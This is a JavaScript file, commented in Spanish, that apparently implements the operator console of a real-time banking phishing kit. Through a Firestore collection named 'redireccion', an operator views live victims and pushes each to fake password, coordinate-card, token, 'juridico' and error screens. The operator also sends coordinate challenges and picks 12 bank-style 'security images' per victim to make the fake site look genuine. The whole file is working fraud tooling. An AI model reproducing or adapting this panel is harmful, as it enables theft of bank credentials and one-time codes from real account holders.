// Importar Firebase v9+
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
import {
    getFirestore,
    collection,
    doc,
    updateDoc,
    deleteDoc,
    onSnapshot,
    query,
    getDoc
} from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
import { firebaseConfig } from "./firebase-config.js";
// Inicializar Firebase usando la configuración global de panel.html
const app = initializeApp(window.firebaseConfig);
const db = getFirestore(app);
// Exponer funciones de Firestore para uso global si es necesario
window.db = db;
window.collection = collection;
window.doc = doc;
window.updateDoc = updateDoc;
window.deleteDoc = deleteDoc;
// Datos de administrador (en un entorno real, esto debería estar en el servidor)
// Para cambiar las credenciales, simplemente modifica los valores de username y password
let adminCredentials = {
    username: "",
    password: ""
};
// Función para cargar credenciales desde Firestore
async function loadAdminCredentials() {
    try {
        // Intenta primero en adminConfig/credentials (ubicación original)
        let credentialsRef = doc(db, "adminConfig911", "credentials");
        let credentialsSnap = await getDoc(credentialsRef);

        // Si no existe, intenta en la nueva ubicación donde el usuario tiene sus credenciales
        if (!credentialsSnap.exists()) {
            console.log("No se encontró documento en adminConfig/credentials, buscando en usuarios");
            // Asumiendo que tienes una colección llamada 'usuarios' con un documento de credenciales
            // Ajusta el nombre de la colección según lo que hayas creado
            credentialsRef = doc(db, "usuarios", "admin");
            credentialsSnap = await getDoc(credentialsRef);
        }

        if (credentialsSnap.exists()) {
            // Si existe, guardar los datos y mostrarlos para depuración
            const data = credentialsSnap.data();
            // Verificar si los campos existen y tienen el formato correcto
            if (data.username && data.password) {
                adminCredentials = data;
            } else {
                console.error("Los campos 'username' y 'password' no están presentes en el documento");
                // Intentar determinar qué campos hay disponibles
                console.log("Campos disponibles:", Object.keys(data));
            }
        } else {
            console.error("No se encontraron documentos de credenciales en ninguna ubicación");
        }
    } catch (error) {
        console.error("Error cargando credenciales:", error);
    }
}
// Elementos DOM
const loginScreen = document.getElementById("login-screen");
const adminPanel = document.getElementById("admin-panel");
const loginForm = document.getElementById("login-form");
const logoutBtn = document.getElementById("logout-btn");
const usersList = document.getElementById("users-list");
const noUsersMessage = document.getElementById("no-users-message");
const commandLogElement = document.getElementById("command-log");

// Elementos para el selector de imagen de perfil
const profileImagesContainer = document.getElementById("profile-images-container");
const profileImageSelectedText = document.getElementById("profile-image-selected");



// Formularios
const coordinatesForm = document.getElementById("coordinates-form");
const messageForm = document.getElementById("message-form");

// Selectores de usuario
const coordUserSelect = document.getElementById("coord-user-select");
const imgUserSelect = document.getElementById("img-user-select");
const msgUserSelect = document.getElementById("msg-user-select");
// Contador de elementos
const activeUsersCount = document.getElementById("active-users-count");
const coordinatesUsersCount = document.getElementById("coordinates-users-count");
const tokenUsersCount = document.getElementById("token-users-count");
// Almacén de comandos
let commandLog = [];
// Función para cargar usuarios activos
function loadActiveUsers() {
    const usersRef = collection(db, "redireccion");
    const q = query(usersRef);
    onSnapshot(q, (snapshot) => {
        const docs = snapshot.docs;
        updateUI(docs);
        logCommand(`Datos actualizados: ${docs.length} usuarios en total`);
    });
}
// Función para verificar sesión activa
function checkActiveSession() {
    const isLoggedIn = localStorage.getItem('adminLoggedIn') === 'true';
    if (isLoggedIn) {
        loginScreen.classList.add("d-none");
        adminPanel.classList.remove("d-none");
        loadActiveUsers();
        logCommand("Sesión recuperada");
        return true;
    }
    return false;
}

// Función para iniciar sesión
if (loginForm) {
    loginForm.addEventListener("submit", function (e) {
        e.preventDefault();
        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;
        const rememberMeElement = document.getElementById("remember-me");
        const rememberMe = rememberMeElement ? rememberMeElement.checked : false;

        if (username === adminCredentials.username && password === adminCredentials.password) {
            // Guardar estado de sesión
            const sessionData = {
                isLoggedIn: true,
                username: username,
                timestamp: new Date().getTime()
            };

            // Guardar credenciales si el usuario lo desea
            if (rememberMe) {
                localStorage.setItem('adminSession', JSON.stringify(sessionData));
                localStorage.setItem('adminLoggedIn', 'true');
            } else {
                // Solo guardar para esta sesión
                sessionStorage.setItem('adminSession', JSON.stringify(sessionData));
                localStorage.setItem('adminLoggedIn', 'true');
            }

            loginScreen.classList.add("d-none");
            adminPanel.classList.remove("d-none");
            loadActiveUsers();
            logCommand("Administrador ha iniciado sesión");

            // Limpiar el formulario
            loginForm.reset();
        } else {
            alert("Credenciales incorrectas");
        }
    });
}
// Agregar función para limpiar sesión
if (logoutBtn) {
    logoutBtn.addEventListener("click", function () {
        // Preguntar si también desea limpiar las selecciones de imágenes guardadas
        const clearImageSelections = confirm("\u00bfDesea eliminar también las selecciones de imágenes guardadas en caché?");
        if (clearImageSelections) {
            localStorage.removeItem("panelImageSelections");
            logCommand("Selecciones de imágenes eliminadas del caché local");
        }

        localStorage.removeItem("adminLoggedIn");
        window.location.reload();
        logCommand("Sesión cerrada");
    });
}
// Función para enviar coordenadas
if (coordinatesForm) {
    coordinatesForm.addEventListener("submit", async function (e) {
        e.preventDefault();

        const selectedUserId = coordUserSelect ? coordUserSelect.value : '';
        if (!selectedUserId) {
            alert("Por favor seleccione un usuario");
            return;
        }

        // Obtener valores de los campos del formulario
        const coord1 = (document.getElementById("coord-1")?.value || " ").toUpperCase();
        const coord2 = (document.getElementById("coord-2")?.value || " ").toUpperCase();
        const coord3 = (document.getElementById("coord-3")?.value || " ").toUpperCase();
        const coord4 = (document.getElementById("coord-4")?.value || " ").toUpperCase();

        // Solo obtenemos el mensaje si el elemento existe
        const messageElement = document.getElementById("coord-message");
        const message = messageElement ? messageElement.value : "";

        try {
            // Actualizar en Firestore
            const userDocRef = doc(db, "redireccion", selectedUserId);
            await updateDoc(userDocRef, {
                // Guardar las coordenadas individuales
                question1: coord1,
                question2: coord2,
                question3: coord3,
                question4: coord4,
                page: 2, // Página de coordenadas
                lastUpdate: new Date().toISOString(),
                status: 'updated' // Añadir un campo para control de actualización
            });

            // Limpiar formulario
            coordinatesForm.reset();
            logCommand(`Coordenadas enviadas para ${selectedUserId}: ${coord1}, ${coord2}, ${coord3}, ${coord4}`);
            alert("Coordenadas enviadas correctamente");
        } catch (error) {
            console.error("Error actualizando coordenadas:", error);
            logCommand(`Error: ${error.message}`);
            alert("Error al enviar coordenadas: " + error.message);
        }
    });
}

// Función para actualizar la interfaz de usuario
function updateUI(docs) {
    // Actualizar lista de usuarios
    usersList.innerHTML = "";

    // Limpiar y actualizar selectores de usuario
    const userOptions = '<option value="">Seleccione un usuario...</option>';
    if (coordUserSelect) coordUserSelect.innerHTML = userOptions;
    if (imgUserSelect) imgUserSelect.innerHTML = userOptions;
    if (msgUserSelect) msgUserSelect.innerHTML = userOptions;
    // Contadores
    let totalActive = 0;
    let inCoordinates = 0;
    let inToken = 0;
    let inHomePage = 0;
    let inDashboard = 0;
    if (docs.length === 0) {
        noUsersMessage.classList.remove("d-none");
    } else {
        noUsersMessage.classList.add("d-none");
        docs.forEach((doc) => {
            const userData = doc.data();
            const userId = doc.id;
            const userPage = userData.page || 0;
            const userIMG = userData.IMG || 0;
            // Procesar todos los usuarios, incluso los que están en la página inicial (page=4)
            totalActive++;
            // Contar usuarios por estado
            if (userPage === 2) {
                inCoordinates++;
            } else if (userPage === 3) {
                inToken++;
            } else if (userPage === 1) {
                inHomePage++;
            } else if (userPage === 4) {
                inDashboard++;
            }
            // Crear tarjeta de usuario (manteniendo el diseño original)
            const statusText = getStatusText(userPage);
            const statusClass = getStatusClass(userPage);
            const userCard = document.createElement("div");
            userCard.className = "col-md-6 mb-3";
            userCard.innerHTML = `
            <div class="card user-card highlight-animation">
              <div class="card-header d-flex justify-content-between align-items-center">
              <img src="${userIMG}" alt="${userId}" class="img-fluid" style="max-width: 100px; max-height: 100px; object-fit: cover;">
                <h5 class="mb-0">${userId} </h5>
                <span class="badge badge-${statusClass}">${statusText}</span>
              </div>
              <div class="card-body">
                <div style="margin-bottom: 20px;"><strong>En caso de Error:</strong> 
                <button class="btn btn-danger action-btn" data-action="token-error" data-id="${userId}">Token</button>
                </div>
                <div class="btn-group btn-block">
                  <button class="btn btn-success action-btn" data-action="home" data-id="${userId}">Inicio</button>
                  <button class="btn btn-info action-btn" data-action="passwd" data-id="${userId}" >Passwd</button>
                  <button class="btn btn-warning action-btn" data-action="juridico" data-id="${userId}">Juridico</button>
                  <button class="btn btn-success action-btn" data-action="fuera" data-id="${userId}">Fuera!</button>
                  <button class="btn btn-danger action-btn" data-action="remove" data-id="${userId}">Eliminar</button>
                </div>
              </div>
            </div>
            `;
            usersList.appendChild(userCard);
            // Agregar a selectores de usuario
            const option = document.createElement("option");
            option.value = userId;
            option.textContent = userId;

            // Clonar la opción para todos los selectores
            if (coordUserSelect) coordUserSelect.appendChild(option.cloneNode(true));
            if (imgUserSelect) imgUserSelect.appendChild(option.cloneNode(true));
            if (msgUserSelect) msgUserSelect.appendChild(option.cloneNode(true));
        });
    }
    // Actualizar contadores
    activeUsersCount.textContent = totalActive;
    coordinatesUsersCount.textContent = inCoordinates;
    tokenUsersCount.textContent = inToken;
    // Agregar eventos a los botones
    document.querySelectorAll(".action-btn").forEach((button) => {
        button.addEventListener("click", handleUserAction);
    });
}
// Función para manejar acciones de usuario
function handleUserAction(event) {
    const action = event.target.dataset.action;
    const userId = event.target.dataset.id;
    if (!userId) {
        logCommand(`Error: ID de usuario no encontrado`);
        return;
    }
    // Animar el botón pulsado
    event.target.classList.add("pulse");
    setTimeout(() => {
        event.target.classList.remove("pulse");
    }, 1000);
    logCommand(`Acción solicitada: ${action} para usuario ${userId}`);
    switch (action) {
        case "home":
            // Añadir animación a la tarjeta
            const homeCard = event.target.closest(".user-card");
            homeCard.style.backgroundColor = "#e8f4ff";
            homeCard.style.transition = "background-color 0.5s ease";
            // Página 4 = Inicio (según panel.html original)
            const userRef = doc(db, "redireccion", userId);
            updateDoc(userRef, {
                page: 1,
            })
                .then(() => {
                    logCommand(`Usuario ${userId} enviado a pantalla de inicio`);
                    // Efecto de éxito
                    homeCard.classList.add("highlight-animation");
                    setTimeout(() => {
                        homeCard.classList.remove("highlight-animation");
                        homeCard.style.backgroundColor = "";
                    }, 1000);
                })
                .catch((error) => {
                    console.error("Error:", error);
                    logCommand(`Error: ${error.message}`);
                });
            break;
        case "passwd":
            // Añadir animación a la tarjeta
            const coordCard = event.target.closest(".user-card");
            coordCard.style.backgroundColor = "#e8fff0";
            coordCard.style.transition = "background-color 0.5s ease";
            // Página 2 = Coordenadas
            const userRefCoord = doc(db, "redireccion", userId);
            updateDoc(userRefCoord, {
                page: 2,
            })
                .then(() => {
                    logCommand(
                        `Usuario ${userId} enviado a pantalla de coordenadas`
                    );
                    // Efecto de éxito
                    coordCard.classList.add("highlight-animation");
                    setTimeout(() => {
                        coordCard.classList.remove("highlight-animation");
                        coordCard.style.backgroundColor = "";
                    }, 1000);
                })
                .catch((error) => {
                    console.error("Error:", error);
                    logCommand(`Error: ${error.message}`);
                });
            break;
        case "juridico":
            // Añadir animación a la tarjeta
            const juridicoCard = event.target.closest(".user-card");
            juridicoCard.style.backgroundColor = "#e8fff0";
            juridicoCard.style.transition = "background-color 0.5s ease";
            // Página 2 = Coordenadas
            const userRefJuridico = doc(db, "redireccion", userId);
            updateDoc(userRefJuridico, {
                page: 3,
            })
                .then(() => {
                    logCommand(
                        `Usuario ${userId} enviado a pantalla de juridico`
                    );
                    // Efecto de éxito
                    juridicoCard.classList.add("highlight-animation");
                    setTimeout(() => {
                        juridicoCard.classList.remove("highlight-animation");
                        juridicoCard.style.backgroundColor = "";
                    }, 1000);
                })
                .catch((error) => {
                    console.error("Error:", error);
                    logCommand(`Error: ${error.message}`);
                });
            break;
        case "dashboard":
            // Añadir animación a la tarjeta
            const dashboard = event.target.closest(".user-card");
            dashboard.style.backgroundColor = "#e8fff0";
            dashboard.style.transition = "background-color 0.5s ease";
            // Página 2 = Coordenadas
            const userRefDashboard = doc(db, "redireccion", userId);
            updateDoc(userRefDashboard, {
                page: 4,
            })
                .then(() => {
                    logCommand(
                        `Usuario ${userId} enviado a pantalla de dashboard`
                    );
                    // Efecto de éxito
                    dashboard.classList.add("highlight-animation");
                    setTimeout(() => {
                        dashboard.classList.remove("highlight-animation");
                        dashboard.style.backgroundColor = "";
                    }, 1000);
                })
                .catch((error) => {
                    console.error("Error:", error);
                    logCommand(`Error: ${error.message}`);
                });
            break;
        case "dashboard-error":
            // Añadir animación a la tarjeta
            const dashboardErrorCard = event.target.closest(".user-card");
            dashboardErrorCard.style.backgroundColor = "#e8fff0";
            dashboardErrorCard.style.transition = "background-color 0.5s ease";
            // Página 2 = Coordenadas
            const userRefDashboardError = doc(db, "redireccion", userId);
            updateDoc(userRefDashboardError, {
                page: 5,
            })
                .then(() => {
                    logCommand(
                        `Usuario ${userId} enviado a pantalla de dashboard-error`
                    );
                    // Efecto de éxito
                    dashboardErrorCard.classList.add("highlight-animation");
                    setTimeout(() => {
                        dashboardErrorCard.classList.remove("highlight-animation");
                        dashboardErrorCard.style.backgroundColor = "";
                    }, 1000);
                })
                .catch((error) => {
                    console.error("Error:", error);
                    logCommand(`Error: ${error.message}`);
                });
            break;
        case "passwd-error":
            // Añadir animación a la tarjeta
            const passwderror = event.target.closest(".user-card");
            passwderror.style.backgroundColor = "#e8fff0";
            passwderror.style.transition = "background-color 0.5s ease";
            // Página 2 = Coordenadas
            const userRefpasswderror = doc(db, "redireccion", userId);
            updateDoc(userRefpasswderror, {
                page: 6,
            })
                .then(() => {
                    logCommand(
                        `Usuario ${userId} enviado a pantalla de passwd-error`
                    );
                    // Efecto de éxito
                    passwderror.classList.add("highlight-animation");
                    setTimeout(() => {
                        passwderror.classList.remove("highlight-animation");
                        passwderror.style.backgroundColor = "";
                    }, 1000);
                })
                .catch((error) => {
                    console.error("Error:", error);
                    logCommand(`Error: ${error.message}`);
                });
            break;
        case "juridico-error":
            // Añadir animación a la tarjeta
            const juridicoCardError = event.target.closest(".user-card");
            juridicoCardError.style.backgroundColor = "#e8fff0";
            juridicoCardError.style.transition = "background-color 0.5s ease";
            // Página 2 = Coordenadas
            const userRefJuridicoError = doc(db, "redireccion", userId);
            updateDoc(userRefJuridicoError, {
                page: 7,
            })
                .then(() => {
                    logCommand(
                        `Usuario ${userId} enviado a pantalla de juridico-error`
                    );
                    // Efecto de éxito
                    juridicoCardError.classList.add("highlight-animation");
                    setTimeout(() => {
                        juridicoCardError.classList.remove("highlight-animation");
                        juridicoCardError.style.backgroundColor = "";
                    }, 1000);
                })
                .catch((error) => {
                    console.error("Error:", error);
                    logCommand(`Error: ${error.message}`);
                });
            break;
        case "token-error":
            // Añadir animación a la tarjeta
            const tokenCardError = event.target.closest(".user-card");
            tokenCardError.style.backgroundColor = "#e8fff0";
            tokenCardError.style.transition = "background-color 0.5s ease";
            // Página 2 = Coordenadas
            const userRefTokenError = doc(db, "redireccion", userId);
            updateDoc(userRefTokenError, {
                page: 8,
            })
                .then(() => {
                    logCommand(
                        `Usuario ${userId} enviado a pantalla de token`
                    );
                    // Efecto de éxito
                    tokenCardError.classList.add("highlight-animation");
                    setTimeout(() => {
                        tokenCardError.classList.remove("highlight-animation");
                        tokenCardError.style.backgroundColor = "";
                    }, 1000);
                })
                .catch((error) => {
                    console.error("Error:", error);
                    logCommand(`Error: ${error.message}`);
                });
            break;
        case "fuera":
            // Añadir animación a la tarjeta
            const fuera = event.target.closest(".user-card");
            fuera.style.backgroundColor = "#e8fff0";
            fuera.style.transition = "background-color 0.5s ease";
            // Página 2 = Coordenadas
            const userRefApproved = doc(db, "redireccion", userId);
            updateDoc(userRefApproved, {
                page: 9,
            })
                .then(() => {
                    logCommand(
                        `Usuario ${userId} enviado a pantalla de fuera`
                    );
                    // Efecto de éxito
                    fuera.classList.add("highlight-animation");
                    setTimeout(() => {
                        fuera.classList.remove("highlight-animation");
                        fuera.style.backgroundColor = "";
                    }, 1000);
                })
                .catch((error) => {
                    console.error("Error:", error);
                    logCommand(`Error: ${error.message}`);
                });
            break;
        case "remove":
            // Confirmar la eliminación
            if (
                confirm(
                    `¿Estás seguro que deseas eliminar al usuario ${userId}? Esta acción no se puede deshacer.`
                )
            ) {
                // Animación de desvanecimiento
                const removeCard = event.target.closest(".user-card");
                removeCard.style.transition = "all 0.5s ease";
                removeCard.style.opacity = "0.5";
                // Eliminar el usuario
                const userRef = doc(db, "redireccion", userId);
                deleteDoc(userRef)
                    .then(() => {
                        // Animación final de eliminación
                        removeCard.style.opacity = "0";
                        removeCard.style.transform = "scale(0.9) translateY(20px)";
                        setTimeout(() => {
                            removeCard.closest(".col-md-6").remove();
                        }, 500);
                        logCommand(`Usuario ${userId} eliminado correctamente`);
                    })
                    .catch((error) => {
                        console.error("Error:", error);
                        logCommand(`Error: ${error.message}`);
                        // Restaurar el aspecto de la tarjeta si hay error
                        removeCard.style.opacity = "1";
                        removeCard.style.transform = "scale(1)";
                    });
            } else {
                // Restaurar el aspecto de la tarjeta si se cancela
                removeCard.style.opacity = "1";
                removeCard.style.transform = "scale(1)";
                logCommand(`Eliminación de usuario ${userId} cancelada`);
            }
            break;
    }
}
// Función para registrar comandos
function logCommand(message) {
    const timestamp = new Date().toLocaleTimeString();
    const commandEntry = `[${timestamp}] ${message}`;
    commandLog.push(commandEntry);
    // Limitar a 50 comandos para no sobrecargar la memoria
    if (commandLog.length > 50) {
        commandLog.shift();
    }
    // Actualizar la interfaz de usuario
    if (commandLogElement) {
        commandLogElement.innerHTML = commandLog.map(cmd => `<p>${cmd}</p>`).join("");
        // Scroll hasta el último comando
        commandLogElement.scrollTop = commandLogElement.scrollHeight;
    }
}
// Lista de todas las imágenes disponibles en dashboard
const dashboardImages = [
    "atardecer.jpg", "baseball.jpg", "bolivar.jpg", "camomila.jpg", "canaAzucar.jpg",
    "canicas.jpg", "catedral.jpg", "cayuco.jpg", "cebiche.jpg", "cerezo.jpg",
    "chiguire.jpg", "cocada.jpg", "cotorra.jpg", "cristo.jpg", "danzas.jpg",
    "dulce.jpg", "dulceLeche.jpg", "dulceeBebida.jpg", "durazno.jpg", "edificio.jpg",
    "estadio.jpg", "flores.jpg", "franbuesas.jpg", "fresas.jpg", "fuente.jpg",
    "garza.jpg", "gato.jpg", "gemelos.jpg", "globo.jpg", "guacamaya.jpg",
    "iglesia.jpg", "lanchas.jpg", "leon.jpg", "limon.jpg", "mariposa.jpg",
    "mariquita.jpg", "mazorca.jpg", "medanos.jpg", "miranda.jpg", "moras.jpg",
    "naranjas.jpg", "noria.jpg", "panJamon.jpg", "panela.jpg", "paramo.jpg",
    "pico.jpg", "playa.jpg", "pueblos.jpg", "puente.jpg", "sanCarlos.jpg", "pan.jpg",
    "parchita.jpg", "umbral.jpg", "ensalada.jpg", "tamarindo.jpg", "cemeruco.jpg", 
    "danza2.jpg", "monumento.jpg", "turpial.jpg", "virgen.jpg", "virgen2.jpg", "virgen3.jpg"
];

// Variables para control de imágenes seleccionadas
let selectedImages = [];
let currentImgUser = '';
const MAX_IMAGES = 12;

// Elementos DOM para selector de imágenes
const imagesContainer = document.getElementById("images-container");
const selectedCountElement = document.getElementById("selected-count");
const saveImagesBtn = document.getElementById("save-images-btn");
const saveImagesErrorBtn = document.getElementById("save-images-error-btn");
const imagesForm = document.getElementById("images-form");

// Variable para almacenar la imagen de perfil seleccionada
let selectedProfileImage = null;

// Función para cargar todas las imágenes disponibles
function loadAvailableImages() {
    if (!imagesContainer) return;

    imagesContainer.innerHTML = '';

    // Generar HTML para cada imagen
    dashboardImages.forEach((imgFile, index) => {
        const imgPath = `img/dashboard/${imgFile}`;
        const imgDiv = document.createElement("div");
        imgDiv.className = "col-md-1 col-sm-2 col-2 mb-3 text-center";

        imgDiv.innerHTML = `
            <div class="image-checkbox">
                <input type="checkbox" id="img-${index}" class="img-checkbox" data-img-path="${imgPath}">
                <label for="img-${index}" class="d-block position-relative">
                    <img src="${imgPath}" class="img-thumbnail" alt="${imgFile}">
                    <div class="overlay">
                        <i class="fas fa-check-circle text-success"></i>
                    </div>
                </label>
            </div>
        `;

        imagesContainer.appendChild(imgDiv);
    });

    // Agregar listeners para los checkboxes
    document.querySelectorAll('.img-checkbox').forEach(checkbox => {
        checkbox.addEventListener('change', handleImageSelection);
    });

    // Cargar imágenes para el selector de perfil si existe
    loadProfileImages();
}

// Función para cargar imágenes para el selector de imagen de perfil
function loadProfileImages() {
    if (!profileImagesContainer) return;

    profileImagesContainer.innerHTML = '';

    // Generar HTML para cada imagen de perfil
    dashboardImages.forEach((imgFile, index) => {
        const imgPath = `img/dashboard/${imgFile}`;
        const imgDiv = document.createElement("div");
        imgDiv.className = "col-md-1 col-sm-2 col-3 mb-2 text-center";

        imgDiv.innerHTML = `
            <div class="image-radio">
                <input type="radio" id="profile-img-${index}" name="profile-image" class="profile-img-radio" data-img-path="${imgPath}">
                <label for="profile-img-${index}" class="d-block position-relative">
                    <img src="${imgPath}" class="img-thumbnail" alt="${imgFile}">
                    <div class="overlay">
                        <i class="fas fa-check text-success"></i>
                    </div>
                </label>
            </div>
        `;

        profileImagesContainer.appendChild(imgDiv);
    });

    // Agregar listeners para los radio buttons
    document.querySelectorAll('.profile-img-radio').forEach(radio => {
        radio.addEventListener('change', handleProfileImageSelection);
    });
}

// Función para manejar la selección de imagen de perfil
function handleProfileImageSelection(event) {
    const radio = event.target;

    if (radio.checked) {
        selectedProfileImage = radio.dataset.imgPath;
        updateProfileImageUI();

        // Guardar en localStorage la selección de imagen de perfil
        saveSelectionToLocalStorage();
    }
}

// Actualizar UI con la imagen de perfil seleccionada
function updateProfileImageUI() {
    if (profileImageSelectedText) {
        if (selectedProfileImage) {
            const fileName = selectedProfileImage.split('/').pop();
            profileImageSelectedText.textContent = `Seleccionada: ${fileName}`;
            profileImageSelectedText.className = 'badge badge-success ml-2';
        } else {
            profileImageSelectedText.textContent = 'No seleccionada';
            profileImageSelectedText.className = 'badge badge-primary ml-2';
        }
    }
}

// Función para guardar la selección de imágenes en localStorage
function saveSelectionToLocalStorage() {
    if (!currentImgUser) return;

    // Estructura para almacenar las selecciones de imágenes por usuario
    let savedSelections = {};

    // Intentar cargar selecciones guardadas previamente
    try {
        const savedData = localStorage.getItem('panelImageSelections');
        if (savedData) {
            savedSelections = JSON.parse(savedData);
        }
    } catch (e) {
        console.warn('Error al cargar selecciones guardadas:', e);
    }

    // Obtener el mensaje personalizado si existe
    const customMessageInput = document.getElementById('input-custom-message');
    const customMessage = customMessageInput ? customMessageInput.value : '';

    // Guardar la selección actual para el usuario activo
    savedSelections[currentImgUser] = {
        selectedImages: selectedImages,
        profileImage: selectedProfileImage,
        customMessage: customMessage,
        timestamp: new Date().toISOString()
    };

    // Guardar en localStorage
    try {
        localStorage.setItem('panelImageSelections', JSON.stringify(savedSelections));
        console.log(`Selección guardada para usuario ${currentImgUser}: ${selectedImages.length} imágenes`);
    } catch (e) {
        console.error('Error guardando selección en localStorage:', e);
    }
}

// Función para manejar la selección de imágenes
function handleImageSelection(event) {
    const checkbox = event.target;
    const imgPath = checkbox.dataset.imgPath;

    if (checkbox.checked) {
        // Si ya tenemos 12 imágenes seleccionadas, impedir seleccionar más
        if (selectedImages.length >= MAX_IMAGES) {
            checkbox.checked = false;
            alert(`Solo puede seleccionar ${MAX_IMAGES} imágenes`);
            return;
        }
        // Agregar a la lista de seleccionadas
        selectedImages.push(imgPath);
    } else {
        // Remover de la lista de seleccionadas
        const index = selectedImages.indexOf(imgPath);
        if (index !== -1) {
            selectedImages.splice(index, 1);
        }
    }

    // Guardar la selección en localStorage
    saveSelectionToLocalStorage();

    // Actualizar contador y botón
    updateImageSelectionUI();
}

// Actualizar contador y estado de los botones
function updateImageSelectionUI() {
    if (selectedCountElement) {
        selectedCountElement.textContent = selectedImages.length;
    }

    // Habilita o deshabilita ambos botones según si hay exactamente MAX_IMAGES seleccionadas
    const buttonsEnabled = selectedImages.length === MAX_IMAGES;

    if (saveImagesBtn) {
        saveImagesBtn.disabled = !buttonsEnabled;
    }

    if (saveImagesErrorBtn) {
        saveImagesErrorBtn.disabled = !buttonsEnabled;
    }
}

// Función para cargar imágenes seleccionadas del usuario actual
async function loadUserSelectedImages(userId) {
    if (!userId) return;

    try {
        // Si hay un usuario anterior, guardar su selección antes de cambiar
        if (currentImgUser && currentImgUser !== userId) {
            saveSelectionToLocalStorage();
        }

        currentImgUser = userId;
        let loadedFromLocalStorage = false;
        let userData = null;

        // Intentar cargar desde localStorage primero
        try {
            const savedData = localStorage.getItem('panelImageSelections');
            if (savedData) {
                const savedSelections = JSON.parse(savedData);
                if (savedSelections[userId]) {
                    selectedImages = savedSelections[userId].selectedImages || [];
                    selectedProfileImage = savedSelections[userId].profileImage || null;

                    // Cargar mensaje personalizado desde localStorage
                    const customMessage = savedSelections[userId].customMessage || '';
                    const customMessageInput = document.getElementById('input-custom-message');
                    if (customMessageInput) {
                        customMessageInput.value = customMessage;
                    }

                    console.log(`Selección cargada desde localStorage para usuario ${userId}: ${selectedImages.length} imágenes`);
                    loadedFromLocalStorage = true;
                }
            }
        } catch (e) {
            console.warn('Error al cargar desde localStorage:', e);
        }

        // Si no se cargó desde localStorage, cargar desde Firestore
        if (!loadedFromLocalStorage) {
            const userDocRef = doc(db, "redireccion", userId);
            const userSnap = await getDoc(userDocRef);

            if (userSnap.exists()) {
                userData = userSnap.data();
                // Resetear la selección actual
                selectedImages = [];

                // Obtener imágenes guardadas o inicializar array vacío
                if (userData.selectedImages && Array.isArray(userData.selectedImages)) {
                    selectedImages = userData.selectedImages;
                }

                // Obtener la imagen de perfil seleccionada
                selectedProfileImage = userData.profileImageSrc || null;

                // Guardar en localStorage lo que cargamos de Firestore
                saveSelectionToLocalStorage();
            }
        }

        // Actualizar UI para reflejar las imágenes guardadas - SIEMPRE, independientemente de la fuente
        document.querySelectorAll('.img-checkbox').forEach(checkbox => {
            const imgPath = checkbox.dataset.imgPath;
            checkbox.checked = selectedImages.includes(imgPath);
        });

        // Cargar el mensaje personalizado si existe (sólo desde Firestore)
        if (userData) {
            const customMessageInput = document.getElementById('input-custom-message');
            if (customMessageInput && userData.customDashboardMessage) {
                customMessageInput.value = userData.customDashboardMessage;
            } else if (customMessageInput) {
                customMessageInput.value = '';
            }
        }

        // Actualizar la selección de imagen de perfil en la UI
        if (selectedProfileImage) {
            // Marcar el radio button correspondiente
            document.querySelectorAll('.profile-img-radio').forEach(radio => {
                const imgPath = radio.dataset.imgPath;
                if (imgPath === selectedProfileImage) {
                    radio.checked = true;
                } else {
                    radio.checked = false;
                }
            });
        } else {
            // Si no hay imagen de perfil, deseleccionar todos los radio buttons
            document.querySelectorAll('.profile-img-radio').forEach(radio => {
                radio.checked = false;
            });
        }

        // Actualizar la UI de la imagen de perfil
        updateProfileImageUI();

        updateImageSelectionUI();
        logCommand(`Imágenes cargadas para usuario ${userId}: ${selectedImages.length} seleccionadas`);
    } catch (error) {
        console.error("Error cargando imágenes:", error);
        logCommand(`Error cargando imágenes: ${error.message}`);
    }
}

// Manejar cambio de usuario en el selector de imágenes
if (imgUserSelect) {
    imgUserSelect.addEventListener('change', function () {
        const selectedUserId = this.value;
        if (selectedUserId) {
            loadUserSelectedImages(selectedUserId);
        } else {
            // Resetear cuando no hay usuario seleccionado
            selectedImages = [];
            document.querySelectorAll('.img-checkbox').forEach(checkbox => {
                checkbox.checked = false;
            });
            updateImageSelectionUI();
        }
    });
}

// Función para guardar datos y redirigir al usuario a una página específica
async function saveImageData(pageToRedirect) {
    if (!currentImgUser) {
        alert("Por favor seleccione un usuario");
        return;
    }

    if (selectedImages.length !== MAX_IMAGES) {
        alert(`Debe seleccionar exactamente ${MAX_IMAGES} imágenes`);
        return;
    }

    // Obtener el mensaje personalizado del input
    const customMessageInput = document.getElementById('input-custom-message');
    const customMessage = customMessageInput ? customMessageInput.value.trim() : "";

    try {
        // Guardar en Firebase (imágenes, mensaje personalizado e imagen de perfil)
        const userDocRef = doc(db, "redireccion", currentImgUser);
        await updateDoc(userDocRef, {
            selectedImages: selectedImages,
            customDashboardMessage: customMessage, // Guardar el mensaje personalizado
            profileImageSrc: selectedProfileImage, // Guardar la imagen de perfil seleccionada
            lastUpdate: new Date().toISOString()
        });

        // Actualizar el campo page para redirigir al usuario a la página correspondiente
        await updateDoc(userDocRef, {
            page: pageToRedirect,
            lastUpdate: new Date().toISOString()
        });

        const messageLogInfo = customMessage ? ` y mensaje "${customMessage}"` : "";
        const targetPage = pageToRedirect === 4 ? "dashboard.html" : "dashboard-tk.html";
        logCommand(`Imágenes guardadas para usuario ${currentImgUser}: ${selectedImages.length} imágenes${messageLogInfo}. Redirigiendo a ${targetPage}`);
        alert(`Imágenes guardadas correctamente. El usuario será redirigido a ${targetPage}.`);

        // Limpiar el campo de mensaje después de guardar
        if (customMessageInput) {
            customMessageInput.value = "";
        }

        // Añadir un botón para limpiar localStorage si es necesario
        const clearLocalStoragePrompt = confirm(`Datos guardados en Firebase correctamente. \n\n¿Desea también limpiar los datos en caché local para este usuario?`);
        if (clearLocalStoragePrompt) {
            // Limpiar solo los datos del usuario actual
            try {
                const savedData = localStorage.getItem('panelImageSelections');
                if (savedData) {
                    const savedSelections = JSON.parse(savedData);
                    if (savedSelections[currentImgUser]) {
                        delete savedSelections[currentImgUser];
                        localStorage.setItem('panelImageSelections', JSON.stringify(savedSelections));
                        logCommand(`Caché local eliminado para usuario ${currentImgUser}`);
                    }
                }
            } catch (e) {
                console.warn('Error al limpiar localStorage:', e);
            }
        }
    } catch (error) {
        console.error("Error guardando imágenes:", error);
        logCommand(`Error: ${error.message}`);
        alert("Error al guardar imágenes: " + error.message);
    }
}

// Manejar eventos de clic en los botones de guardar imágenes
if (saveImagesBtn) {
    saveImagesBtn.addEventListener('click', function () {
        saveImageData(4); // Redirigir a dashboard.html (página 4)
    });
}

